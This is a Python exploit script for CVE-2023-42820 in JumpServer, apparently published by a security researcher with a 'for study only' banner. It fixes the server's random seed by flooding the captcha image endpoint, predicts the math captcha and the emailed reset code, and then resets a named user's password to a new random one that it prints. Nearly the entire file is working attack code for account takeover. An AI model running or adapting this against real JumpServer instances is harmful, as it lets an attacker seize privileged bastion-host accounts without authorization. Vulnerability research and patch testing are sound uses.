# -*- coding: utf-8 -*-
# @Author  : Tong
# @Time    : 10/9/2023 5:01 PM
# @Function:
'''
步骤
1.请求验证码url1（GET"/core/auth/password/forget/previewing/"）
2.批量发送url1，固定seed（GET”/core/auth/captcha/image/*“）
3.请求验证码url2（GET"/core/auth/password/forget/previewing/"）
4.提取url2中的csrftoken1，cookie1
5.使用固定seed预测url2验证码 math_challenge()
6.携带csrftoken1，cookie1提交检验url2验证码（POST”/core/auth/password/forget/previewing/“）
7.若返回302，Location开头为/core/auth/password/forgot/?则表示通过url2验证
8.请求通过验证后的Location （GET”/core/auth/password/forgot/?“）
9.获取csrftoken2，cookie2
10.批量发送url1，再次固定seed（GET”/core/auth/captcha/image/*“）
11.请求获取邮箱验证码（POST”“/api/v1/authentication/password/reset-code/?token=）
12.使用固定的seed预测邮箱验证码
13.验证预测是否正确（POST"/core/auth/password/forgot/?token="）
14.返回302

'''
import json
import random
import string
import sys
import time
from urllib.parse import urljoin, parse_qs, urlparse

import requests
from bs4 import BeautifulSoup
from http.cookies import SimpleCookie
import concurrent.futures

def begin():
        print('''

  ______     _______     ____   ___ ____  _____       _  _  ____  ___ ____    ___
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ /      | || ||___ \( _ )___ \  / _ \ 
| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____| || |_ __) / _ \ __) || | | |
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____|__   _/ __/ (_) / __/ | |_| |
 \____|  \_/  |_____|   |_____|\___/_____|____/         |_||_____\___/_____| \___/ 
                            @Auth: T0ngMystic
                            @tips: Exp仅供学习使用，请勿用于其他用途    
                            @Blog: https://t0ngmystic.com             

        ''')

def math_challenge():  # get captcha challenge
    operators = ("+", "*", "-")
    operands = (random.randint(1, 10), random.randint(1, 10))
    operator = random.choice(operators)
    if operands[0] < operands[1] and "-" == operator:
        operands = (operands[1], operands[0])
    challenge = "%d%s%d" % (operands[0], operator, operands[1])
    return (
        "{}=".format(challenge.replace("*", "*")),
        str(eval(challenge)),
    )


string_punctuation = '!#$%&()*+,-.:;<=>?@[]^_~'


def random_string(length: int, lower=True, upper=True, digit=True, special_char=False):  # get email code
    args_names = ['lower', 'upper', 'digit', 'special_char']
    args_values = [lower, upper, digit, special_char]
    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation]
    args_string_map = dict(zip(args_names, args_string))
    kwargs = dict(zip(args_names, args_values))
    kwargs_keys = list(kwargs.keys())
    kwargs_values = list(kwargs.values())
    args_true_count = len([i for i in kwargs_values if i])
    assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`'
    assert length >= args_true_count, f'Expected length >= {args_true_count}, bug got {length}'

    can_startswith_special_char = args_true_count == 1 and special_char

    chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v])

    while True:
        password = list(random.choice(chars) for i in range(length))
        for k, v in kwargs.items():
            if v and not (set(password) & set(args_string_map[k])):
                # 没有包含指定的字符, retry
                break
        else:
            if not can_startswith_special_char and password[0] in args_string_map['special_char']:
                # 首位不能为特殊字符, retry
                continue
            else:
                # 满足要求终止 while 循环
                break

    password = ''.join(password)
    return password


def getPreviewing(domain):
    previewingUrl = "/core/auth/password/forget/previewing/"
    re = requests.get(urljoin(domain, previewingUrl))
    soup = BeautifulSoup(re.text, 'html.parser')

    # 查找<input>标签，并获取value属性的值
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    img_tag = soup.find('img', {'alt': 'captcha', 'class': 'captcha'})
    img_src = img_tag['src'] if img_tag else None
    cookies_header = re.headers.get("Set-Cookie")
    # 使用SimpleCookie来解析Cookie字符串
    cookie = SimpleCookie()
    cookie.load(cookies_header)

    # 创建一个字典，用于存储Cookie键值对
    cookie_dict = {key: morsel.value for key, morsel in cookie.items()}
    return csrf_token, img_src, cookie_dict


def postPreviewing(domain, csrf_token, username, captcha_0, captcha, cookie):
    previewingUrl = "/core/auth/password/forget/previewing/"
    data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': username,
        'captcha_0': captcha_0,
        'captcha_1': captcha
    }
    re = requests.post(url=urljoin(domain, previewingUrl), data=data, cookies=cookie, allow_redirects=False)
    return re


def send_http_request(url, num_requests):
    for _ in range(num_requests):
        response = requests.get(url)
        # 在这里你可以处理响应，比如打印状态码等
    # print(response.status_code)


def send_concurrent_http_requests(url, num_threads, num_requests_per_thread):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        # 启动多个线程，每个线程发送 num_requests_per_thread 个请求
        futures = [executor.submit(send_http_request, url, num_requests_per_thread) for _ in range(num_threads)]

        # 等待所有线程完成
        concurrent.futures.wait(futures)
        executor.shutdown()


def lockSeed(domain, img_url, num, threadNum):
    print("Locked seeding!")
    number = num
    threadNumber = threadNum
    send_concurrent_http_requests(urljoin(domain, img_url), threadNumber, number)
    print("Locked seed.")


def useSeed(seed, num):
    random.seed(seed)
    for char in range(num):
        random.randrange(*(-35, 35))

    for p in range(int(180 * 38 * 0.1)):
        random.randint(0, 180), random.randint(0, 38)


def getPasswordForgot(domain, url):
    re = requests.get(urljoin(domain, url))
    soup = BeautifulSoup(re.text, 'html.parser')

    # 查找<input>标签，并获取value属性的值
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    cookies_header = re.headers.get("Set-Cookie")
    # 使用SimpleCookie来解析Cookie字符串
    cookie = SimpleCookie()
    cookie.load(cookies_header)

    # 创建一个字典，用于存储Cookie键值对
    cookie_dict = {key: morsel.value for key, morsel in cookie.items()}
    return csrf_token, cookie_dict


def postMailCaptcha(domain, url, email, cookie_dict):
    X_CSRFToken = cookie_dict['jms_csrftoken']
    X_Requested_With = 'XMLHttpRequest'
    data = {
        "form_type": "email",
        "email": email,
        "sms": ""
    }
    headers = {
        'Content-Type': 'application/json',
        'X-CSRFToken': X_CSRFToken,
        'X-Requested-With': X_Requested_With
    }
    json_data = json.dumps(data)
    re = requests.post(url=urljoin(domain, url), data=json_data, headers=headers, cookies=cookie_dict)
    return re


def challengeMailCaptcha(domain, token, csrf_token, email, code, cookie_dict):
    url = "/core/auth/password/forgot/?token=" + token
    data = {
        'csrfmiddlewaretoken': csrf_token,
        'form_type': 'email',
        'email': email,
        'sms': '',
        'code': code
    }
    re = requests.post(url=urljoin(domain, url), data=data, cookies=cookie_dict,
                       allow_redirects=False)
    return re


def getPasswordReset(domain, location):
    re = requests.get(urljoin(domain, location))
    soup = BeautifulSoup(re.text, 'html.parser')

    # 查找<input>标签，并获取value属性的值
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    cookies_header = re.headers.get("Set-Cookie")
    # 使用SimpleCookie来解析Cookie字符串
    cookie = SimpleCookie()
    cookie.load(cookies_header)

    # 创建一个字典，用于存储Cookie键值对
    cookie_dict = {key: morsel.value for key, morsel in cookie.items()}
    return csrf_token, cookie_dict


def generate_random_password(length):
    # 定义密码字符集
    characters = string.ascii_letters + string.digits + string.punctuation

    # 生成随机密码
    password = ''.join(random.choice(characters) for _ in range(length))

    return password


def postPasswordReset(domain, location, csrf_token, cookie_dict):
    password = generate_random_password(8)
    data = {
        'csrfmiddlewaretoken': csrf_token,
        'new_password': password,
        'confirm_password': password
    }
    re = requests.post(url=urljoin(domain, location), data=data, cookies=cookie_dict, allow_redirects=False)

    return re, password


if __name__ == '__main__':
    if len(sys.argv) == 4 :
        domain = sys.argv[1]
        name = sys.argv[2]
        email = sys.argv[3]
        begin()
        print("CVE-2023-42820 is running, please wait a moment!")
        # 1.请求验证码url1（GET"/core/auth/password/forget/previewing/"）
        csrf_token1, img_src1, cookie_dict1 = getPreviewing(domain)
        parts = img_src1.split("/")
        seed = parts[-2]
        print("Get seed :" + seed)
        # 2.批量发送url1，固定seed（GET” / core / auth / captcha / image / *“）
        lockSeed(domain, img_src1, 5, 20)
        # 3.请求验证码url2（GET"/core/auth/password/forget/previewing/"）
        # 4.提取url2中的csrftoken1，cookie1
        csrf_token2, img_src2, cookie_dict2 = getPreviewing(domain)
        # 5.使用固定seed预测url2验证码math_challenge()

        # 6.携带csrftoken1，cookie1提交检验url2验证码（POST” / core / auth / password / forget / previewing /“）
        parts1 = img_src2.split("/")
        captcha_0 = parts1[-2]
        # re = postPreviewing(domain=domain, csrf_token=csrf_token2, username=name, captcha_0=captcha_0, captcha=text[1],
        #                     cookie=cookie_dict2)
        for i in range(3, 6):
            useSeed(seed, i)
            text = math_challenge()
            # 6.携带csrftoken1，cookie1提交检验url2验证码（POST” / core / auth / password / forget / previewing /“）
            parts1 = img_src2.split("/")
            captcha_0 = parts1[-2]
            re = postPreviewing(domain=domain, csrf_token=csrf_token2, username=name, captcha_0=captcha_0,
                                captcha=text[1],
                                cookie=cookie_dict2)
            if re.status_code == 302 and re.headers['Location'].startswith("/core/auth/password/forgot/?token="):
                # 7.若返回302，Location开头为 / core / auth / password / forgot /?则表示通过url2验证
                print(re.headers["Location"])
                print("textNumber: " + str(i))
                if re.status_code == 302 and re.headers['Location'].startswith("/core/auth/password/forgot/?token="):
                    print("PASS captcha")
                    locationUrl = re.headers['Location']
                    # 8.请求通过验证后的Location （GET” / core / auth / password / forgot /?“）
                    # 9.获取csrftoken2，cookie2
                    csrf_token3, cookie_dict3 = getPasswordForgot(domain, locationUrl)
                    # 10.批量发送url1，再次固定seed（GET” / core / auth / captcha / image / *“）
                    lockSeed(domain, img_src1, 5, 20)
                    # 11.请求获取邮箱验证码（POST”“ / api / v1 / authentication / password / reset - code /?token =）
                    parsed_url = urlparse(locationUrl)
                    query_params = parse_qs(parsed_url.query)
                    token = query_params["token"][0]
                    mailCaptchaUrl = "/api/v1/authentication/password/reset-code/?token=" + token
                    mailCaptchaResponse = postMailCaptcha(domain, mailCaptchaUrl, email, cookie_dict3)
                    print(mailCaptchaResponse.text)
                    if mailCaptchaResponse.text.find("ok"):
                        # 12.使用固定的seed预测邮箱验证码
                        useSeed(seed, i)
                        code = random_string(6, lower=False, upper=False)
                        # 13.携带csrftoken2，cookie2验证预测是否正确（POST"/core/auth/password/forgot/?token="）
                        time.sleep(5)
                        challengeMailCaptchaResponse = challengeMailCaptcha(domain, token, csrf_token3, email, code,
                                                                            cookie_dict3)
                        if challengeMailCaptchaResponse.status_code == 302 and challengeMailCaptchaResponse.headers[
                            'Location'].startswith("/core/auth/password/reset/?token="):
                            print("PASS MAIL CAPTCHA")
                            location = challengeMailCaptchaResponse.headers['Location']
                            csrf_token4, cookie_dict4 = getPasswordReset(domain, location)
                            postPasswordResetResponse, password = postPasswordReset(domain, location, csrf_token4,
                                                                                    cookie_dict4)
                            if postPasswordResetResponse.status_code == 302 and postPasswordResetResponse.headers[
                                'Location'].startswith("/core/common/flash-message/?code="):
                                print("JumpServer User(" + name + ") password has changed. Password: " + password)
                        else:
                            print("MAIL CAPTCHA ERROR")
                break
    else:
        print("""Help:
                python .\CVE-2023-42820.py <JumpServer_Domain> <UserName> <UserEmail> """)
        sys.exit()
